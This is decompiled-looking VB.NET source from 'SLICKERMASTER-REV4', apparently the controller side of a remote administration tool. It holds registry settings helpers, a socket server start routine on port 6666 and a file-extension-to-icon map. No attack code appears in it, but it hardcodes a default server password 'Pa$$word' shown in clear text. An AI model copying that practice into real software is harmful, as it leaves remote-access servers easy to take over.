Imports Microsoft.VisualBasic.CompilerServices

Public Class Class1
#Region "===== Fields ====="
    Public Shared string_0 As String = String.Format("SLICKERMASTER-REV4 {0} -[x]", string_1)
    Public Shared string_1 As String = "BETA"
    Public Shared string_2 As String = "users"
    Public Shared string_3 As String = "SM-4"
    Public Shared png As Integer = 0
    Public Shared long_0 As Long
    Public Shared long_1 As Long
    Public Shared Yy As String = "||"
#End Region
#Region "===== Methods ====="
    Public Shared Sub SavSTNG(ByVal string_0 As String, ByVal string_1 As String)
        Try
            My.Computer.Registry.CurrentUser.CreateSubKey(("Software\" & Class1.string_3)).SetValue(string_0, string_1)
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            Form1.RepD("Class1SavSTNG-->" + ex.Message, 0)
        End Try
    End Sub
    Public Shared Function LoadSTNG(ByVal string_0 As String, ByVal string_1 As String) As String
        Dim str As String
        Try
            str = Conversions.ToString(My.Computer.Registry.CurrentUser.OpenSubKey(("Software\" & Class1.string_3)).GetValue(string_0, string_1))
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            Form1.RepD("Class1LoadSTNG-->" + ex.Message, 0)
            str = string_1
        End Try
        Return str
    End Function
    Public Shared Sub smethod_sserv()
        Try
            Form1.S.Start(Class3.Port)
            Form1.pb_status.Image = My.Resources.bg
            Form1.pb_status.Text = "Socket Server Status: listening on " & Class3.Port.ToString()
            NetworkSettings.Port.Enabled = False
            NetworkSettings.Pass.Enabled = False
            NetworkSettings.strt.Text = "Stop"

        Catch ex As Exception
            NetworkSettings.strt.Text = "Stop"
            MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Form1.RepD("Class1sserv-->" + ex.Message, 0)
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Public Shared Function smethod_1(ByVal long_1 As Long) As String
        If (long_1.ToString.Length < 4) Then
            Return (Conversions.ToString(long_1) & " Bytes")
        End If
        Dim str As String = String.Empty
        Dim num As Double = (CDbl(long_1) / 1024)
        If (num < 1024) Then
            str = "KB"
        Else
            num = (num / 1024)
            If (num < 1024) Then
                str = "MB"
            Else
                num = (num / 1024)
                str = "GB"
            End If
        End If
        Return (num.ToString(".0") & " " & str)
    End Function
    Public Shared Function smethod_2() As String
        Return My.Computer.Clock.LocalTime.ToString("[hh:mm:ss]")
    End Function
    Public Shared Function smethod_2a() As String
        Return My.Computer.Clock.LocalTime.ToString("dd/MM/yyyy hh:mm:ss")
    End Function
    Public Shared Sub smethod_da()
        'For Each row As DataGridViewRow In Form1.L1.Rows
        '    Form1.S.Disconnect(row.Index)
        'Next
    End Sub
    Public Shared Function smethod_6(ByVal ext As String) As Integer
        If ext.EndsWith(".exe") Or ext.EndsWith(".EXE") Or ext.EndsWith(".scr") Or ext.EndsWith(".SCR") Then
            Return 3
        ElseIf ext.EndsWith(".jpg") Or ext.EndsWith(".JPG") Or ext.EndsWith(".jpeg") Or ext.EndsWith(".JPEG") Or ext.EndsWith(".ico") Or ext.EndsWith(".ICO") Or ext.EndsWith(".svg") Or ext.EndsWith(".SVG") Or ext.EndsWith(".svgz") Or ext.EndsWith(".SVGZ") Or ext.EndsWith(".drw") Or ext.EndsWith(".DRW") Or ext.EndsWith(".psp") Or ext.EndsWith(".PSP") Or ext.EndsWith(".gif") Or ext.EndsWith(".GIF") Or ext.EndsWith(".png") Or ext.EndsWith(".PNG") Or ext.EndsWith(".bmp") Or ext.EndsWith(".BMP") Or ext.EndsWith(".dib") Or ext.EndsWith(".DIB") Or ext.EndsWith(".jpe") Or ext.EndsWith(".JPE") Or ext.EndsWith(".jfif") Or ext.EndsWith(".JFIF") Or ext.EndsWith(".tif") Or ext.EndsWith(".TIF") Or ext.EndsWith(".tiff") Or ext.EndsWith(".TIFF") Then
            Return 4
        ElseIf ext.EndsWith(".txt") Or ext.EndsWith(".TXT") Or ext.EndsWith(".log") Or ext.EndsWith(".LOG") Or ext.EndsWith(".readme") Or ext.EndsWith(".README") Or ext.EndsWith(".me") Or ext.EndsWith(".ME") Then
            Return 5
        ElseIf ext.EndsWith(".dll") Or ext.EndsWith(".DLL") Or ext.EndsWith(".db") Or ext.EndsWith(".DB") Then
            Return 6
        ElseIf ext.EndsWith(".zip") Or ext.EndsWith(".ZIP") Or ext.EndsWith(".rar") Or ext.EndsWith(".RAR") Or ext.EndsWith(".7z") Or ext.EndsWith(".7Z") Or ext.EndsWith(".jar") Or ext.EndsWith(".JAR") Or ext.EndsWith(".tar") Or ext.EndsWith(".TAR") Or ext.EndsWith(".tgz") Or ext.EndsWith(".TGZ") Or ext.EndsWith(".gz") Or ext.EndsWith(".GZ") Or ext.EndsWith(".bz2") Or ext.EndsWith(".BZ2") Or ext.EndsWith(".tbz2") Or ext.EndsWith(".TBZ2") Or ext.EndsWith(".gzip") Or ext.EndsWith(".GZIP") Or ext.EndsWith(".z") Or ext.EndsWith(".Z") Or ext.EndsWith(".sit") Or ext.EndsWith(".SIT") Or ext.EndsWith(".cab") Or ext.EndsWith(".CAB") Or ext.EndsWith(".lzh") Or ext.EndsWith(".LZH") Or ext.EndsWith(".pkg") Or ext.EndsWith(".PKG") Then
            Return 7
        ElseIf ext.EndsWith(".bat") Or ext.EndsWith(".BAT") Or ext.EndsWith(".cmd") Or ext.EndsWith(".CMD") Then
            Return 8
        ElseIf ext.EndsWith(".avi") Or ext.EndsWith(".AVI") Or ext.EndsWith(".divx") Or ext.EndsWith(".DIVX") Or ext.EndsWith(".mkv") Or ext.EndsWith(".MKV") Or ext.EndsWith(".webm") Or ext.EndsWith(".WEBM") Or ext.EndsWith(".mp4") Or ext.EndsWith(".MP4") Or ext.EndsWith(".m4v") Or ext.EndsWith(".M4V") Or ext.EndsWith(".mp4v") Or ext.EndsWith(".MP4V") Or ext.EndsWith(".mpv4") Or ext.EndsWith(".MPV4") Or ext.EndsWith(".ogm") Or ext.EndsWith(".OGM") Or ext.EndsWith(".ogv") Or ext.EndsWith(".OGV") Or ext.EndsWith(".flv") Or ext.EndsWith(".FLV") Or ext.EndsWith(".mpeg") Or ext.EndsWith(".MPEG") Or ext.EndsWith(".mpg") Or ext.EndsWith(".MPG") Or ext.EndsWith(".mp2v") Or ext.EndsWith(".MP2V") Or ext.EndsWith(".mpv2") Or ext.EndsWith(".MPV2") Or ext.EndsWith(".m1v") Or ext.EndsWith(".M1V") Or ext.EndsWith(".m2v") Or ext.EndsWith(".M2V") Or ext.EndsWith(".m2p") Or ext.EndsWith(".M2P") Or ext.EndsWith(".mpe") Or ext.EndsWith(".MPE") Or ext.EndsWith(".ts") Or ext.EndsWith(".TS") Or ext.EndsWith(".m2ts") Or ext.EndsWith(".M2TS") Or ext.EndsWith(".mts") Or ext.EndsWith(".MTS") Or ext.EndsWith(".m2t") Or ext.EndsWith(".M2T") Or ext.EndsWith(".tps") Or ext.EndsWith(".TPS") Or ext.EndsWith(".hdmov") Or ext.EndsWith(".HDMOV") Or ext.EndsWith(".mov") Or ext.EndsWith(".MOV") Or ext.EndsWith(".3gp") Or ext.EndsWith(".3GP") Or ext.EndsWith(".3gpp") Or ext.EndsWith(".3GPP") Or ext.EndsWith(".wmv") Or ext.EndsWith(".WMV") Or ext.EndsWith(".asf") Or ext.EndsWith(".ASF") Or ext.EndsWith(".ifo") Or ext.EndsWith(".IFO") Or ext.EndsWith(".vob") Or ext.EndsWith(".VOB") Or ext.EndsWith(".mpls") Or ext.EndsWith(".MPLS") Or ext.EndsWith(".rm") Or ext.EndsWith(".RM") Or ext.EndsWith(".rmvb") Or ext.EndsWith(".RMVB") Or ext.EndsWith(".mp3") Or ext.EndsWith(".MP3") Or ext.EndsWith(".it") Or ext.EndsWith(".IT") Or ext.EndsWith(".asx") Or ext.EndsWith(".ASX") Or ext.EndsWith(".au") Or ext.EndsWith(".AU") Or ext.EndsWith(".mid") Or ext.EndsWith(".MID") Or ext.EndsWith(".midi") Or ext.EndsWith(".MIDI") Or ext.EndsWith(".snd") Or ext.EndsWith(".SND") Or ext.EndsWith(".wma") Or ext.EndsWith(".WMA") Or ext.EndsWith(".aiff") Or ext.EndsWith(".AIFF") Or ext.EndsWith(".ogg") Or ext.EndsWith(".OGG") Or ext.EndsWith(".oga") Or ext.EndsWith(".OGA") Or ext.EndsWith(".mka") Or ext.EndsWith(".MKA") Or ext.EndsWith(".m4a") Or ext.EndsWith(".M4A") Or ext.EndsWith(".aac") Or ext.EndsWith(".AAC") Or ext.EndsWith(".flac") Or ext.EndsWith(".FLAC") Or ext.EndsWith(".wv") Or ext.EndsWith(".WV") Or ext.EndsWith(".mpc") Or ext.EndsWith(".MPC") Or ext.EndsWith(".ape") Or ext.EndsWith(".APE") Or ext.EndsWith(".apl") Or ext.EndsWith(".APL") Or ext.EndsWith(".alac") Or ext.EndsWith(".ALAC") Or ext.EndsWith(".tta") Or ext.EndsWith(".TTA") Or ext.EndsWith(".ac3") Or ext.EndsWith(".AC3") Or ext.EndsWith(".dts") Or ext.EndsWith(".DTS") Or ext.EndsWith(".amr") Or ext.EndsWith(".AMR") Or ext.EndsWith(".ra") Or ext.EndsWith(".RA") Or ext.EndsWith(".wav") Or ext.EndsWith(".WAV") Or ext.EndsWith(".mpcpl") Or ext.EndsWith(".MPCPL") Or ext.EndsWith(".m3u") Or ext.EndsWith(".M3U") Or ext.EndsWith(".pls") Or ext.EndsWith(".PLS") Then
            Return 9
        ElseIf ext.EndsWith(".lnk") Or ext.EndsWith(".LNK") Then
            Return 10
        ElseIf ext.EndsWith(".bin") Or ext.EndsWith(".BIN") Or ext.EndsWith(".bak") Or ext.EndsWith(".BAK") Or ext.EndsWith(".dat") Or ext.EndsWith(".DAT") Then
            Return 11
        ElseIf ext.EndsWith(".xlsx") Or ext.EndsWith(".XLSX") Or ext.EndsWith(".xlsm") Or ext.EndsWith(".XLSM") Or ext.EndsWith(".xlsb") Or ext.EndsWith(".XLSB") Or ext.EndsWith(".xltm") Or ext.EndsWith(".XLTM") Or ext.EndsWith(".xlam") Or ext.EndsWith(".XLAM") Or ext.EndsWith(".xltx") Or ext.EndsWith(".XLTX") Or ext.EndsWith(".xll") Or ext.EndsWith(".XLL") Then
            Return 12
        ElseIf ext.EndsWith(".doc") Or ext.EndsWith(".DOC") Or ext.EndsWith(".rtf") Or ext.EndsWith(".RTF") Or ext.EndsWith(".docx") Or ext.EndsWith(".DOCX") Or ext.EndsWith(".docm") Or ext.EndsWith(".DOCM") Or ext.EndsWith(".psw") Or ext.EndsWith(".PSW") Or ext.EndsWith(".dot") Or ext.EndsWith(".DOT") Or ext.EndsWith(".dotx") Or ext.EndsWith(".DOTX") Or ext.EndsWith(".dotm") Or ext.EndsWith(".DOTM") Then
            Return 13
        ElseIf ext.EndsWith(".ini") Or ext.EndsWith(".INI") Or ext.EndsWith(".sys") Or ext.EndsWith(".SYS") Or ext.EndsWith(".css") Or ext.EndsWith(".CSS") Or ext.EndsWith(".inf") Or ext.EndsWith(".INF") Then
            Return 14
        ElseIf ext.EndsWith(".pdf") Or ext.EndsWith(".PDF") Then
            Return 15
        ElseIf ext.EndsWith(".pptx") Or ext.EndsWith(".PPTX") Or ext.EndsWith(".ppt") Or ext.EndsWith(".PPT") Or ext.EndsWith(".pps") Or ext.EndsWith(".PPS") Or ext.EndsWith(".pptm") Or ext.EndsWith(".PPTM") Or ext.EndsWith(".potx") Or ext.EndsWith(".POTX") Or ext.EndsWith(".potm") Or ext.EndsWith(".POTM") Or ext.EndsWith(".ppam") Or ext.EndsWith(".PPAM") Or ext.EndsWith(".ppsx") Or ext.EndsWith(".PPSX") Or ext.EndsWith(".ppsm") Or ext.EndsWith(".PPSM") Then
            Return 16
        ElseIf ext.EndsWith(".swf") Or ext.EndsWith(".SWF") Or ext.EndsWith(".htm") Or ext.EndsWith(".HTM") Or ext.EndsWith(".html") Or ext.EndsWith(".HTML") Then
            Return 17
        ElseIf ext.EndsWith(".reg") Or ext.EndsWith(".REG") Then
            Return 18
        ElseIf ext.EndsWith(".xml") Or ext.EndsWith(".XML") Then
            Return 19
        ElseIf ext.EndsWith(".odt") Or ext.EndsWith(".ODT") Or ext.EndsWith(".ott") Or ext.EndsWith(".OTT") Or ext.EndsWith(".sxw") Or ext.EndsWith(".SXW") Or ext.EndsWith(".stw") Or ext.EndsWith(".STW") Or ext.EndsWith(".sor") Or ext.EndsWith(".SOR") Or ext.EndsWith(".sxc") Or ext.EndsWith(".SXC") Or ext.EndsWith(".stc") Or ext.EndsWith(".STC") Or ext.EndsWith(".sxi") Or ext.EndsWith(".SXI") Or ext.EndsWith(".sti") Or ext.EndsWith(".STI") Or ext.EndsWith(".sxd") Or ext.EndsWith(".SXD") Or ext.EndsWith(".std") Or ext.EndsWith(".STD") Or ext.EndsWith(".sxg") Or ext.EndsWith(".SXG") Then
            Return 20
        ElseIf ext.EndsWith(".temp") Or ext.EndsWith(".TEMP") Or ext.EndsWith(".tmp") Or ext.EndsWith(".TMP") Then
            Return 21
        ElseIf ext.EndsWith(".iso") Or ext.EndsWith(".ISO") Then
            Return 22
        ElseIf ext.EndsWith(".js") Or ext.EndsWith(".JS") Then
            Return 23
        ElseIf ext.EndsWith(".sln") Or ext.EndsWith(".SLN") Or ext.EndsWith(".vb") Or ext.EndsWith(".VB") Or ext.EndsWith(".resx") Or ext.EndsWith(".RESX") Then
            Return 24
        Else
            Return 11
        End If
    End Function
#End Region
End Class

Public Class Class3
#Region "===== Fields ====="
    Public Shared AutoStartSS As Boolean = False
    Public Shared Port As Integer = 6666
    Public Shared Pass As String = "Pa$$word"
    Public Shared ShowPass As Boolean = True
#End Region
#Region "===== Methods ====="
    Public Shared Sub smethod_0()
        AutoStartSS = Convert.ToBoolean(Class1.LoadSTNG("ss", AutoStartSS.ToString()))
        Port = Convert.ToInt32(Class1.LoadSTNG("pr", Port.ToString()))
        Pass = Convert.ToString(Class1.LoadSTNG("pw", Pass.ToString()))
        ShowPass = Convert.ToBoolean(Class1.LoadSTNG("sp", ShowPass.ToString()))
    End Sub
    Public Shared Sub smethod_1()
        Class1.SavSTNG("ss", NetworkSettings.autostrt.Checked.ToString())
        Class1.SavSTNG("pr", NetworkSettings.Port.Value.ToString())
        Class1.SavSTNG("pw", NetworkSettings.Pass.Text.ToString())
        Class1.SavSTNG("sp", NetworkSettings.shps.Checked.ToString())
        smethod_0()
    End Sub
    Public Shared Sub smethod_2()
        NetworkSettings.autostrt.Checked = AutoStartSS
        NetworkSettings.Port.Value = Port
        NetworkSettings.Pass.Text = Pass
        NetworkSettings.shps.Checked = ShowPass
    End Sub
#End Region
End Class
